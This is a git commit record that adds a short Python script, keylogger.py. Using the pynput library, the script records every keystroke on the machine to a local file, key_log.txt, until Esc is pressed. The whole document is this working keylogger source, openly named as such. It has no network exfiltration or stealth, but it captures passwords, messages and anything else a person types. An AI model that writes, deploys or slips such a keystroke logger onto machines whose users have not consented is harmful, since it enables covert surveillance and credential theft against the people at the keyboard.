84e4b5ef0966c053c4967ab054b9850fb9515ff7
Nishant Kondal <nishantkondal@gmail.com>
2024-09-21 10:04:58 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,23 @@
+from pynput.keyboard import Key, Listener
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            if key == Key.space:
+                f.write(" ")
+            elif key == Key.enter:
+                f.write("\n")
+            else:
+                f.write(f" {key} ")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
